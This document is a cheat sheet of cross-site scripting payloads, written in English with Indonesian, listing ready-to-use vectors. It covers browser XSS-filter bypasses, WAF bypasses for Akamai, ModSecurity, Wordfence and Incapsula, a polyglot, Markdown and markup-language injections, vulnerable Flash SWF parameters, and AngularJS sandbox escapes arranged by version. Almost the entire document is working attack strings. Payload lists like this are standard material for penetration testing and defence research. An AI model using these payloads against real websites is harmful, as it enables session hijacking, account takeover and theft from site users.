## XSS

**Chrome XSS-Auditor Bypass** oleh[@vivekchsm](https://twitter.com/vivekchsm)

```html
<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
```

**Chrome < v60 beta XSS-Auditor Bypass**

```html
<script src="data:,alert(1)%250A-->
```

**Other Chrome XSS-Auditor Bypasses/Bypass Auditor Chrome XSS Lainnya**

```html
<script>alert(1)</script
```

```html
<script>alert(1)%0d%0a-->%09</script
```

```html
<x>%00%00%00%00%00%00%00<script>alert(1)</script>
```

**Safari XSS Vector** oleh [@mramydnei](https://twitter.com/mramydnei/status/902470271327551489)

```html
<script>location.href;'javascript:alert%281%29'</script>
```

**XSS Polyglot** oleh [Ahmed Elsobky](https://github.com/0xSobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

**Kona WAF (Akamai) Bypass/Jalan pintas Kona WAF (Akamai).**

```html
\');confirm(1);//
```

**ModSecurity WAF Bypass/Bypass WAF Keamanan Modifikasi**
Catatan: Jenis ini bergantung pada tingkat keamanan aplikasi yang disetel. [Melihat](https://modsecurity.org/rules.html)

```html
<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>
```

**Wordfence XSS Bypasses**

```html
<meter onmouseover="alert(1)"
```

```html
'">><div><meter onmouseover="alert(1)"</div>"
```

```html
>><marquee loop=1 width=0 onfinish=alert(1)>
```

**Incapsula WAF Bypasses** oleh [@i_bo0om](https://twitter.com/i_bo0om)

```html
<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
```

```html
<img/src=q onerror='new Function`al\ert\`1\``'>
```

**jQuery < 3.0.0 XSS**
 oleh [Egor Homakov](https://github.com/jquery/jquery/issues/2432)

```js
$.get('http://sakurity.com/jqueryxss')
```

Untuk benar-benar mengeksploitasi jQuery XSS ini Anda harus memenuhi salah satu persyaratan berikut:

1) Temukan permintaan lintas domain ke domain tidak tepercaya yang mungkin menjalankan skrip secara tidak sengaja.
2) Temukan permintaan apa pun ke titik akhir API tepercaya tempat skrip dapat dimasukkan ke sumber data.

**URL verification bypasses (works without `&#x09;` too)/Pengabaian verifikasi URL (juga berfungsi tanpa `&#x09;`)**

```
javas&#x09;cript://www.google.com/%0Aalert(1)
```

**Markdown XSS**

```md
[a](javascript:confirm(1))
```

```md
[a](javascript://www.google.com%0Aprompt(1))
```

```md
[a](javascript://%0d%0aconfirm(1);com)
```

```md
[a](javascript:window.onerror=confirm;throw%201)
```

**Flash SWF XSS**

- ZeroClipboard: `ZeroClipboard.swf?id=\"))}catch(e){confirm(/XSS./.source);}//&width=500&height=500&.swf`

- plUpload Player: `plupload.flash.swf?%#target%g=alert&uid%g=XSS&`

- plUpload MoxiePlayer: `Moxie.swf?target%g=confirm&uid%g=XSS` (also works with `Moxie.cdn.swf` and other variants)

- FlashMediaElement: <code>flashmediaelement.swf?jsinitfunctio%gn=alert`1`</code>

- videoJS: `video-js.swf?readyFunction=confirm` and `video-js.swf?readyFunction=alert%28document.domain%2b'%20XSS'%29`

- YUI "io.swf": `io.swf?yid=\"));}catch(e){alert(document.domain);}//`

- YUI "uploader.swf": `uploader.swf?allowedDomain=\%22}%29%29%29}catch%28e%29{alert%28document.domain%29;}//<`

- Open Flash Chart: `open-flash-chart.swf?get-data=(function(){alert(1)})()`

- AutoDemo: `control.swf?onend=javascript:alert(1)//`

- Adobe FLV Progressive: `/main.swf?baseurl=asfunction:getURL,javascript:alert(1)//` and `/FLVPlayer_Progressive.swf?skinName=asfunction:getURL,javascript:alert(1)//`

- Banner.swf (generic): `banner.swf?clickTAG=javascript:alert(document.domain);//`

- JWPlayer (legacy): `player.swf?playerready=alert(document.domain)` and `/player.swf?tracecall=alert(document.domain)`

- SWFUpload 2.2.0.1: `swfupload.swf?movieName="]);}catch(e){}if(!self.a)self.a=!confirm(1);//`

- FlowPlayer 3.2.7: `flowplayer-3.2.7.swf?config={"clip":{"url":"http://edge.flowplayer.org/bauhaus.mp4","linkUrl":"JavaScriPt:confirm(document.domain)"}}&.swf`

_Catatan: Referensi berguna untuk membuat payload XSS berbasis Flash [MWR Labs](https://labs.mwrinfosecurity.com/blog/popping-alert1-in-flash/)._

**Lightweight Markup Languages/Bahasa Markup Ringan**

**RubyDoc** (.rdoc)

```rdoc
XSS[JavaScript:alert(1)]
```

**Textile** ([.textile](https://txstyle.org/))

```textile
"Test link":javascript:alert(1)
```

**reStructuredText/Teks Terstruktur ulang** ([.rst](http://docutils.sourceforge.net/docs/user/rst/quickref.html))

```rst
`Test link`__.

__ javascript:alert(document.domain)  
```

**Unicode characters/Karakter Unicode**

```html
†‡•＜img src=a onerror=javascript:alert('hacked')>…‰€
```

**AngularJS Template Injection based XSS/XSS berbasis Injeksi Template AngularJS**

*Untuk verifikasi manual pada target langsung, gunakan `angular.version` di konsol browser Anda*

**1.0.1 - 1.1.5** oleh [Mario Heiderich (Cure53)](https://twitter.com/0x6D6172696F)

```js
{{constructor.constructor('alert(1)')()}}
```

**1.2.0 - 1.2.1** oleh [Jan Horn (Google)](https://twitter.com/tehjh)

```js
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

**1.2.2 - 1.2.5** oleh [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
```

**1.2.6 - 1.2.18** oleh [Jan Horn (Google)](https://twitter.com/tehjh)

```js
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
```

**1.2.19 - 1.2.23** oleh [Mathias Karlsson](https://twitter.com/avlidienbrunn)

```js
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
```

**1.2.24 - 1.2.29** oleh [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
```

**1.3.0** oleh [Gábor Molnár (Google)](https://twitter.com/molnar_g)

```
{{!ready && (ready = true) && (
      !call
      ? $$watchers[0].get(toString.constructor.prototype)
      : (a = apply) &&
        (apply = constructor) &&
        (valueOf = call) &&
        (''+''.toString(
          'F = Function.prototype;' +
          'F.apply = F.a;' +
          'delete F.a;' +
          'delete F.valueOf;' +
          'alert(1);'
        ))
    );}}
```

**1.3.1 - 1.3.2** oleh [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{
    {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
    'a'.constructor.prototype.charAt=''.valueOf; 
    $eval('x=alert(1)//'); 
}}
```

**1.3.3 - 1.3.18** oleh [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join; 

  'a'.constructor.prototype.charAt=[].join;
  $eval('x=alert(1)//');  }}
```

**1.3.19** oleh [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{
    'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join; 
    $eval('x=alert(1)//'); 
}}

```

**1.3.20** oleh [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

**1.4.0 - 1.4.9** ooleh [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

**1.5.0 - 1.5.8** oleh [Ian Hickey](https://twitter.com/ianhickey1024)

```js
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

**1.5.9 - 1.5.11** oleh [Jan Horn (Google)](https://twitter.com/tehjh)

```js
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```

**1.6.0+** (no [Expression Sandbox](http://angularjs.blogspot.co.uk/2016/09/angular-16-expression-sandbox-removal.html)) oleh [Mario Heiderich (Cure53)](https://twitter.com/0x6D6172696F)

```js
{{constructor.constructor('alert(1)')()}}
```
